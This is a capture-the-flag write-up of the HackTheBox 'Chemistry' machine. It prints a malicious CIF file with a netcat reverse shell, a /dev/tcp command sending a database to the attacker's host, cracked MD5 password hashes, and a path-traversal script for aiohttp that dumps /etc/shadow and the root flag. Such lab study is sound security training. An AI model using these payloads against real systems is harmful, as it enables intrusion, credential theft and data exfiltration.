
Chemistry is an Active seasonal machine by HackTheBox, no writeup exists for this yet, so I am hacking this blind.

I start with `nmap`, and I see port `5000` is open.

```
nmap 10.129.126.61
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 16:43 CDT
Nmap scan report for 10.129.126.61
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

I run a directory search against port `5000`:

```
$ sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.129.126.61:5000
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.126.61:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 926]
/register             (Status: 200) [Size: 931]
/upload               (Status: 405) [Size: 153]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/dashboard            (Status: 302) [Size: 235] [--> /login?next=%2Fdashboard]

```

So the directories `/login` and `register` could be my way in. In the page`/register`, I create a username and password and I am let right into `/dashboard`. On the dashboard page there is input to upload a `cif` file.

There is a Proof of Concept on github: https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f, with the file text:

```

data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.207 4444 -e /bin/bash");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

The reverse shell I used was `busybox nc 10.10.14.207 4444 -e /bin/bash` to call my netcat listener running on port `4444` locally.

To improve my shell I run `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

In my entry point was the file `app.py`, I was able to `cat` the file and it seems to be running `flask`, which is a python web-server/web-app. In the file there are some mentions in the code, near routing information, of a database. *So perhaps*, there is some user privilege escalation value in getting into the database.

In the directory `instance`, which shares a directory with `app.py`, is a file `database.db`, which I assume is the database. I want to send this file back to my local for further analysis, so I spin up another `netcat` listener on my local

```
$ sudo nc -lnvp 2222 > database.db
```

And I pipe the file to this listener with a reverse shell:

```
cat database.db > /dev/tcp/10.10.14.207/2222
```

On my local I run the following commands:

```
$ sqlite3 database.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> tables
structure  user
sqlite> select* from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|name|1a1dc91c907325c69271ddf0c944bc72
```

I saw the user `rosa` earlier while moving around the victim's box, so I attempt to unencrypt the password. With help from chatgpt, I find that it is an `MD5 hash`. I attempt to unencrypt with `hashcat`.

```
$ echo "63ed86ee9f624c7b14f1d4f43dc251a5" > hashfile.txt
$ hashcat -m 0 -a 0 -o cracked.txt hashfile.txt /usr/share/wordlists/rockyou.txt
...
$ cat cracked.txt
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
```

And I can use the above credentials to `ssh` into `rosa`'s account. Once I get in there is a file in the entry point `user.txt` which has the user flag.

```
rosa@chemistry:~$ ss -tulpn
...
tcp      LISTEN    0         128              127.0.0.1:8080            0.0.0.0:*                                        
```

After some research I see port 8080 is listening. 

```
rosa@chemistry:~$ nc -vz 127.0.0.1 8080
Connection to 127.0.0.1 8080 port [tcp/http-alt] succeeded!
rosa@chemistry:~$ curl http://127.0.0.1:8080
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
```

A netcat call to the port internally, succeeds, I see that I'm able to ping it. I can hit the endpoint with a `curl` command and I get html in response. 

```
rosa@chemistry:~$ curl -I http://127.0.0.1:8080
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Thu, 24 Oct 2024 03:20:52 GMT
Server: Python/3.9 aiohttp/3.9.1
```

I see the server is running `aiohttp/3.9.1`, which is exploitable via the following github POC: 
https://github.com/z3rObyte/CVE-2024-23334-PoC

After running the following `exploit.sh`

```
#!/bin/bash

url="http://127.0.0.1:8081"
string="../"
payload="/assets/"
file="etc/shadow" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

The file will make Local File Vulnerability attempts like below:

```
[+] Testing with /static/../etc/passwd
	Status code --> 404
[+] Testing with /static/../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../../../../../../../../etc/passwd
	Status code --> 404
[+] Testing with /static/../../../../../../../../../../../../../../../etc/passwd
	Status code --> 404

```

After running directory brute forces, using `gobuster` and `feroxbuster`, I found the `assets` directory, which I updated the payload in the shell script.

The `/etc/passwd` file gets the following output:

```
bash exploit.sh
[+] Testing with /assets/../etc/passwd
	Status code --> 404
[+] Testing with /assets/../../etc/passwd
	Status code --> 404
[+] Testing with /assets/../../../etc/passwd
	Status code --> 200
root:x:0:0:root:/root:/bin/bash
```

So for the password, there is just an `x`. But when I try the shadow file, I get an encrypted password.

```
$ bash exploit.sh
[+] Testing with /assets/../etc/shadow
	Status code --> 404
[+] Testing with /assets/../../etc/shadow
	Status code --> 404
[+] Testing with /assets/../../../etc/shadow
	Status code --> 200
root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
```

I was unable to crack the password after running `hascat` and `john` for 4+ hours :( (sad face).

I was able to get the root flag by changing the lines in `exploit.sh`:

```
#!/bin/bash

url="http://127.0.0.1:8081"
string="../"
payload="/assets/"
file="root/root.txt" # Change this line

...
```

I changed the file variable, as the `etc` directory is in the same linux system directory as `root`.

When I run `exploit.sh`, I get the `root` flag in `/root/root.txt`:

```
$ bash exploit.sh
[+] Testing with /assets/../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../../root/root.txt
	Status code --> 200
77cf7b0ef8d75c155cf78a5f00b4b137
```
